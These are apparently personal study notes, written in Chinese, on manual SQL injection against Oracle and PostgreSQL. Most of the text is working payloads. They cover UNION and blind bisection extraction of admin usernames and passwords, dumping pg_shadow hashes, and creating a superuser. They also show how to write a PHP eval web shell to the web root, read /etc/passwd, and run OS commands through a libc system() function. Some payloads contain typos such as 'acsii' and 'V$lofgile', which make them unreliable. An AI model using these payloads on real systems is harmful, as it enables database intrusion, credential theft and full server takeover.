### Oracle&&postgresql注入

航空、物流时会碰到Oracle；比较大的机构一般用这个；因为它比较稳定安全可靠而且贵；

#### Oracle注入原理

- 判断注入

  ```sql
  and 1=1
  and 1=2
  # 加个/，  -0
  ```

- 判断Oracle数据库

  ```sql
  and exists(select * from dual)  # 表空间
  and exists(select * from user_tables)
  ```

##### 第一种注入方式

- 判断列数

  ```sql
  ?id=111 order by 10	# 正常
  ?id=111 order by 20	# 正常
  ?id=111 order by 21	# 返回错误
  
  # 说明列长是20
  id=111 UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, from dual
  # 在字符列上去爆信息
  ```

- 获取基本信息

  ```sql
  # 获取数据库版本
  (select banner from sys.v_$version where rownum=1)
  # 获取OS版本
  (select memeber from V$lofgile where rownum=1)
  # 获取连接数据库的当前用户
  (select SYS_CONTEXT('USERENV','CURRENT_USER')from dual)
  # 获取数据库
  (select owner from all_tables where rownum=1)
  
  /* 然后把null的地方替换为以上某条语句就可以了 */
  ```

- 获取表

  ```sql
  # 获取第一个表
  select table_name from user_tables where rownum=1
  
  # 获取第二个表
  select table_name from user_tables where rownum=1 and table_name<>'admin'
  ```

- 获取列名

  ```sql
  # 第一个列名
  select column_name from user_tab_columns where table_name='admin' and rownum=1
  # 第二个列名
  select column_name from user_tab_columns where table_name='admin' and rownum=1 and column_name<>'id'
  ```

- 获取数据

  ```sql
  select name from admin
  # 在字符列上爆出用户名和密码
  union select null,null,name,null,null,null, from admin
  union select null,null,passed,null,null,null, from admin
  ```

##### 第二种注入方式

很像爆破；

- 猜表

  ```sql
  # 看他是否返回正常，正常则说明存在admin表
  and select count(*) from admin <>0
  # 返回错误，就尝试其他表；比如username、manager等常用表名
  ```

- 猜有几个管理员

  ```sql
  and (select count(*) from admin)=1
  # 如果有多个管理员，入侵成功的几率加大
  ```

- 猜列名

  `and (select count(name) from admin)>=0   # 返回正常，则存在name列`

- 利用ascii码 折半法才加admin帐号和密码

  ```sql
  # 判断name的长度
  and (select count(*) from admin where length(name)>=5)=1
  # 判断第一行name的第一个字符
  and (select count(*) from admin where acsii(substr(name,1,1))>=97)=1
  # 判断第一行name的第二个字符
  and (select count(*) from admin where acsii(substr(name,2,1))>=97)=1
  
  # 判断第一行pwd的第一个字符
  and (select count(*) from admin where acsii(substr(pwd,1,1))>=97)=1
  ```

注入和access差不多；两种方法；

 order by联合查询；   对管理员用户名和密码进行逐个猜解；



> dual、user_tables——表空间；是什么？
>
> rownum=1表示了什么？



#### postgresql注入原理

国外的一些小型的购物站点会用到这个数据库；日本用的多一些；

- 注入常用语法

  ```sql
  # 判断是否是它
  +and+1::int=1--		/* 返回正常就是postgresql数据库 */
  http://mysq.sql.com/sql.php?id=1+and+1::
  # 判断数据库版本信息
  +and+1=cast(version() as int)
  # 判断当前用户
  +and+1=cast(user||123 as int)	/*  postgress相当于mssql的sa权限*/
  # 判断有多少字段
  order by
  union select null,null,null
  # 判断当前用户
  union select null,user,null
  
  
  # 判断db版本信息
  union select null,version(),null--
  # 判断用户权限
  union select null,current_schema(),null
  # 判断当前db名称
  union select null,current_database(),null
  # 判断当前表名
  union select null,relname,null from pg_stat_user_tables
  # 读取某个表的列名
  union select null,column_name,null from information_schema.columns where table_name='admin'
  
  # 读数据
  union select null,name||pass,null from admin
  # 查看db的帐号密码
  union select null,username||chr(124)||passwd,null from pg_shadow
  # 创建用户
  ;create user seven with superuser password 'seven'--
  # 修改postgres用户密码为123456
  ;alter user postgres with password '123456'
  ```

- postgresql写shell

  - 直接拿shell

    `?id=1;create table shell(shell text not null); `

    `?id=1;insert into shell values($$<?php @eval($_POST['value']);?>$$);`

    `?id=1;copy shell(shell) to '/var/www/html/shell.php'`

  - 另一种方法

    `;copy (select '$$<?php @eval($_POST['value']);?>$$') to 'c:/inetpub/wwwroot/mysql-sql/dd.php'`

    读文件的前20行；写到注入点，null那边就可以了；

    `pg_read_file('/etc/passwd',1,20)`

- 创建system函数

  ```sql
  1. 用于版本大于8的数据库创建一个system的函数： 
  create FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT
  2. 创建一个输出表： 
  create table stdout(id serial, system_out text)
  3.执行shell，输出到输出表内： 
  select system(‘uname -a > /tmp/test’)
  4.copy输出的内容到表里面： 
  COPY stdout(system_out) FROM ‘/tmp/test’
  5.从输出表内读取执行后的回显，判断是否执行成功： 
  union all select NULL,(select stdout from system_out order by id desc),NULL limit 1 offset 1–-
  ```

- 数据库备份还原

  ```sql
  1.备份数据库：
  pg_dump -O -h 168.192.0.5 -U postgres mdb >c:\mdb.sql”
  # 这个是远程备份数据库备份到本地来
  pg_dump -O -h 192.168.0.5 -U dbowner -w -p 5432 SS >SS.sql? 
  2.还原数据库： 
  psql -h localhost -U postgres -d mdb
  ```


[参考链接|即刻安全](http://www.secist.com/archives/453.html)

> 所以说写了shell有什么用？能拿来干什么？
>
> ​	- 是不是打开



一般丢给sqlmap去跑就行了；但是也要学一下手工怎么注；

